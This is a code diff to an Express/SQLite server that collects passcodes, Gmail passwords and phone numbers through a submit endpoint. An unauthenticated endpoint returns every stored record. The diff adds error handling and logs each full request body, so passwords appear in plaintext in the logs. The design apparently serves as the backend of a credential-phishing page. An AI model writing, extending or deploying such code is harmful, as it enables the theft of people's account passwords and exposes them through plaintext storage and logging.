@@ -8,18 +8,25 @@ import fs from "fs";
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const db = new Database("submissions.db");
-
-// Initialize database
-db.exec(`
-  CREATE TABLE IF NOT EXISTS submissions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    passcode TEXT,
-    gmail_password TEXT,
-    phone_number TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )
-`);
+let db: Database.Database;
+try {
+  db = new Database("submissions.db");
+  console.log("Database initialized successfully");
+  
+  // Initialize database
+  db.exec(`
+    CREATE TABLE IF NOT EXISTS submissions (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      passcode TEXT,
+      gmail_password TEXT,
+      phone_number TEXT,
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+  `);
+  console.log("Submissions table ensured");
+} catch (err) {
+  console.error("Failed to initialize database:", err);
+}
 
 async function startServer() {
   const app = express();
@@ -29,30 +36,30 @@ async function startServer() {
 
   // API Route to handle submissions
   app.post("/api/submit", (req, res) => {
+    console.log("POST /api/submit hit with body:", req.body);
     const { passcode, gmailPassword, phoneNumber } = req.body;
     
     try {
       const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
-      stmt.run(passcode, gmailPassword, phoneNumber);
+      const result = stmt.run(passcode, gmailPassword, phoneNumber);
       
-      console.log("New submission received:");
-      console.log(`- Passcode: ${passcode}`);
-      console.log(`- Gmail Password: ${gmailPassword}`);
-      console.log(`- Phone Number: ${phoneNumber}`);
-      
-      res.json({ success: true });
+      console.log("Successfully saved submission, ID:", result.lastInsertRowid);
+      res.json({ success: true, id: result.lastInsertRowid });
     } catch (error) {
-      console.error("Database error:", error);
+      console.error("Database error during save:", error);
       res.status(500).json({ error: "Failed to save submission" });
     }
   });
 
   // API Route to view submissions
   app.get("/api/submissions", (req, res) => {
+    console.log("GET /api/submissions hit");
     try {
       const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
+      console.log(`Returning ${rows.length} submissions`);
       res.json(rows);
     } catch (error) {
+      console.error("Database error during fetch:", error);
       res.status(500).json({ error: "Failed to fetch submissions" });
     }
   });
